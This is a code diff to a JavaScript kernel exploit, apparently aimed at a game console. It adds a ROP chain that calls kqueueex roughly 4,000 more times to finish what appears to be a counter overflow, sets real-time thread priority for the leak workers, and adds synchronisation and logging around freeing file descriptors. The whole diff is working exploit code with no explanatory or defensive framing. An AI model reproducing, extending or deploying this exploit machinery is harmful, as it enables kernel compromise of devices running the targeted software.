@@ -56,6 +56,9 @@
         const MAIN_RTPRIO = 256;
 
         const LEAK_CORES = [0, 1, 2, 3];
+        const LEAK_SYSCALLS = 0x100000001n;
+        const LEAK_FD_MAX = 8192n
+        const LEAK_SYSCALLS_FINAL = 0xFEDn;
 
         const SYSCALL_EXTRA = {
             recvmsg: 0x1bn,
@@ -196,7 +199,7 @@
             return read64(thr_handle);
         }
 
-        function build_leak_worker_chain(core, pipe_rfd, finished_addr, dummybuf, unroll, remainder) {
+        function build_leak_worker_chain(core, pipe_rfd, finished_addr, dummybuf, unroll, remainder, rt_prio) {
             const POC_ARG = 0x800000000000n;
             const EXIT_MARK = 0xDEADn;
             const STACK_SIZE = 0x4000 + (unroll * 31 + remainder * 6 + 0x200) * 8;
@@ -221,6 +224,13 @@
             emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
             emit(ROP.pop_rcx); emit(0x10n);
             emit(ROP.pop_r8); emit(mask);
+            emit(syscall_wrapper);
+            emit(ROP.ret);
+
+            emit(ROP.pop_rax); emit(SYSCALL.rtprio_thread);
+            emit(ROP.pop_rdi); emit(RTP_SET);
+            emit(ROP.pop_rsi); emit(0n);
+            emit(ROP.pop_rdx); emit(rt_prio);
             emit(syscall_wrapper);
             emit(ROP.ret);
             const LOOP_START = idx;
@@ -288,6 +298,63 @@
             emit(syscall_wrapper);
 
             return { entry, pivotAddr: at(PIVOT), exitAddr: at(EXIT) };
+        }
+
+        function build_kqueueex_final_chain(count, core, finished_addr, rt_prio) {
+            const POC_ARG = 0x800000000000n;
+            const STACK_SIZE = 0x4000 + (Number(count) * 6 + 256) * 8;
+
+            const buf = malloc(STACK_SIZE);
+            const chain_ab = allocated_buffers[allocated_buffers.length - 1];
+            const chain_view = new BigUint64Array(chain_ab);
+            // Zero the guard region (first 0x4000 bytes = 0x800 u64 entries).
+            chain_view.fill(0n, 0, 0x800);
+
+            const entry = buf + 0x4000n;
+            const ENTRY_START = 0x800; // chain_view index where the ROP chain starts
+
+            const mask = malloc(0x10);
+            write64(mask + 0x0n, 1n << BigInt(core));
+            write64(mask + 0x8n, 0n);
+
+            let idx = 0;
+            const emit = (v) => { chain_view[ENTRY_START + idx++] = v; };
+
+            emit(ROP.ret);
+            emit(ROP.ret);
+
+            emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
+            emit(ROP.pop_rdi); emit(3n);
+            emit(ROP.pop_rsi); emit(1n);
+            emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
+            emit(ROP.pop_rcx); emit(0x10n);
+            emit(ROP.pop_r8); emit(mask);
+            emit(syscall_wrapper);
+            emit(ROP.ret);
+
+            emit(ROP.pop_rax); emit(SYSCALL.rtprio_thread);
+            emit(ROP.pop_rdi); emit(RTP_SET);
+            emit(ROP.pop_rsi); emit(0n);
+            emit(ROP.pop_rdx); emit(rt_prio);
+            emit(syscall_wrapper);
+            emit(ROP.ret);
+
+            for (let k = 0; k < Number(count); k++) {
+                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
+                emit(ROP.pop_rdi); emit(POC_ARG);
+                emit(syscall_wrapper);
+                emit(ROP.ret);
+            }
+
+            emit(ROP.pop_rax); emit(1n);
+            emit(ROP.pop_rdi); emit(finished_addr);
+            emit(ROP.mov_qword_rdi_rax);
+
+            emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
+            emit(ROP.pop_rdi); emit(0n);
+            emit(syscall_wrapper);
+
+            return entry;
         }
 
         function ulog(msg) {
@@ -777,7 +844,7 @@
             write64(rl + 8n, nofile_hard);
             syscall(SYSCALL.setrlimit, 8n, rl);
 
-            const cand = ["/dev/", "/", "/app0/", "/dev/urandom",
+            const cand = ["/dev/null", "/dev/", "/", "/app0/", "/dev/urandom",
                 "/dev/notification0", "/dev/gc"];
             let held_path = 0n;
             for (let c = 0; c < cand.length; c++) {
@@ -819,7 +886,7 @@
 
             await js_sleep(10000);
 
-            const TOTAL_SYSCALLS = 0x100000001n - BigInt(free_fds_num);
+            const TOTAL_SYSCALLS = LEAK_SYSCALLS - LEAK_SYSCALLS_FINAL - BigInt(free_fds_num);
 
             const POC_ARG = 0x800000000000n;
             const EXIT_MARK = 0xDEADn;
@@ -834,6 +901,11 @@
             const base_share = TOTAL_SYSCALLS / BigInt(NW);
             const extra0 = TOTAL_SYSCALLS - base_share * BigInt(NW);
             const lws = [];
+
+            const rt_prio = malloc(4);
+            write16(rt_prio, PRI_REALTIME);
+            write16(rt_prio + 2n, 256n);
+
             for (let w = 0; w < NW; w++) {
                 const target_w = base_share + (w === 0 ? extra0 : 0n);
                 const bplus1_w = target_w / U;
@@ -847,12 +919,19 @@
                 const dummybuf = malloc(8);
                 const chain = build_leak_worker_chain(
                     LEAK_CORES[w], rfd, finished, dummybuf, LEAK_UNROLL,
-                    Number(remainder_w));
+                    Number(remainder_w), rt_prio);
                 spawn_leak_worker(chain.entry);
                 lws.push({
                     chain, rfd, wfd, finished,
                     normal: normal_w, queued: 0n
                 });
+            }
+
+            let final_chain_entry = null;
+            let final_chain_done_ptr = null;
+            if (LEAK_SYSCALLS_FINAL > 0n) {
+                final_chain_done_ptr = malloc(8);
+                final_chain_entry = build_kqueueex_final_chain(LEAK_SYSCALLS_FINAL, LEAK_CORES[0], final_chain_done_ptr, rt_prio);
             }
 
             let all_fed = false;
@@ -878,19 +957,54 @@
                     if (read64(lw.finished) === 0n) break;
                 }
             }
+            await ulog("feeding done, waiting for workers to finish");
+            for (const lw of lws) {
+                write64(lw.finished, 0n);
+            }
+            while (true) {
+                await js_sleep(3000);
+                let all_idle = true;
+                for (const lw of lws) {
+                    if (read64(lw.finished) !== 0n) {
+                        all_idle = false;
+                        write64(lw.finished, 0n);
+                    }
+                }
+                if (all_idle) break;
+            }
+            await ulog("all workers idle, updating pivot");
 
             for (const lw of lws) {
                 write64(lw.chain.pivotAddr, lw.chain.exitAddr);
                 write64(lw.finished, 0n);
                 syscall(SYSCALL.write, BigInt(lw.wfd), chunkbuf, 1n);
             }
-            for (const lw of lws) {
+            for (let i = 0; i < lws.length; i++) {
+                const lw = lws[i];
                 const dl = Date.now() + 15000;
                 while (read64(lw.finished) !== EXIT_MARK && Date.now() < dl)
-                    await js_sleep(50);
+                    await js_sleep(500);
+                if (read64(lw.finished) !== EXIT_MARK) {
+                    await ulog("worker " + i + " timeout waiting for EXIT_MARK");
+                }
                 syscall(SYSCALL.close, BigInt(lw.rfd));
                 syscall(SYSCALL.close, BigInt(lw.wfd));
             }
+
+            if (final_chain_entry !== null) {
+                await ulog("launching kqueueex_final_chain...");
+                write64(final_chain_done_ptr, 0n);
+                await js_sleep(500);
+                spawn_leak_worker(final_chain_entry);
+
+                while (true) {
+                    await js_sleep(200);
+                    if (read64(final_chain_done_ptr) !== 0n) break;
+                }
+                await ulog("kqueueex_final_chain finished successfully");
+            }
+
+            await ulog("preparing free-fd");
 
             for (let i = 0; i < free_fds_num; i++) {
                 const fd = new_free_fd();
